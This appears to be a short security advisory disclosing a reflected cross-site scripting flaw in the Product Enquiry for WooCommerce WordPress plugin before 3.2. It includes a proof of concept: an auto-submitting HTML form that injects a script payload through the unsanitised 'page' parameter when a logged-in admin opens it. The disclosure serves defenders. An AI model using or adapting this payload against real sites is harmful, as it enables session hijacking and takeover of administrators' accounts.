## WordPress Plugin Vulnerabilities

# Product Enquiry for WooCommerce < 3.2 - Reflected XSS

### Description

The plugin does not sanitise and escape the page parameter before outputting it back in an attribute, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

Make a logged in admin open a page with the code below
<body onload="document.forms[0].submit()">
<form action="https://example.com/wp-admin/admin.php?page=GMWQP&view=list" method="POST">
<input type="text" name="page" value='"><script>alert(/XSS/)</script>'>
<input type="submit" value="submit">
</form>
</body>
